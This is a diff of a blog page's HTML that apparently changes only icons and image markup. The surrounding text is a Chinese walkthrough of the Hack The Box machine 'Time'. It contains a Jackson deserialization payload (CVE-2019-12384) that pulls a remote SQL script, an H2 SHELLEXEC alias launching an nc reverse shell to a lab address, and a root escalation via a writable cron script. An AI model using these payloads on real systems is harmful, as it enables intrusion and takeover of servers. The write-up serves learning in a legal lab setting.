@@ -123,7 +123,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -217,7 +217,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.214</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-29 14:53 CST</span><br><span class="line">Nmap scan report for 10.10.10.214</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)</span><br><span class="line">|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)</span><br><span class="line">|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>是一个Online JSON beautifier &amp; validator：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102901.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h1><p>Validate功能是beta，输入一些测试payload信息得到不同报错：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN</span><br><span class="line"></span><br><span class="line">&#123;&quot;test&quot;&#125;</span><br><span class="line">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object</span><br><span class="line"></span><br><span class="line">[&quot;test&quot;]</span><br><span class="line">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id &#39;test&#39; as a subtype of [simple type, class java.lang.Object]: no such class found</span><br></pre></td></tr></table></figure>
 
@@ -231,12 +238,33 @@
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line"><span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"url"</span>: <span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.10:9999\/inject.sql'"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
 <p>打到pericles的shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102902.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102903.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="inject-sql"><a href="#inject-sql" class="headerlink" title="inject.sql"></a>inject.sql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="keyword">String</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line">        <span class="keyword">String</span>[] command = &#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, cmd&#125;;</span><br><span class="line">        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");</span><br><span class="line">        return s.hasNext() ? s.next() : "";  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 4445 &gt;/tmp/f'</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>pericles用户桌面得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102904.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>为了方便后续操作可以直接写ssh公钥进去</p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>pspy跑一下，发现一个timer_backup.sh定时运行，并且这个文件我们可写,那么我们直接修改这个文件就可以以root权限执行任意命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.10:9999/pspy64</span><br><span class="line"></span><br><span class="line">2020/10/29 07:19:31 CMD: UID=0    PID=6480   | /bin/bash /usr/bin/timer_backup.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pericles@time:~$ ls -al /usr/bin/timer_backup.sh</span><br><span class="line">-rwxrw-rw- 1 pericles pericles 88 Oct 29 07:20 /usr/bin/timer_backup.sh</span><br></pre></td></tr></table></figure>
@@ -246,7 +274,16 @@
 
 <p>然后等它自动执行后就可以直接以root身份ssh连接</p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>root用户目录得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102905.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Jackson gadgets - Anatomy of a vulnerability · Doyensec’s Blog<br><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank" rel="noopener">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
 <li>jas502n/CVE-2019-12384: Jackson Rce For CVE-2019-12384<br><a href="https://github.com/jas502n/CVE-2019-12384" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-12384</a></li>
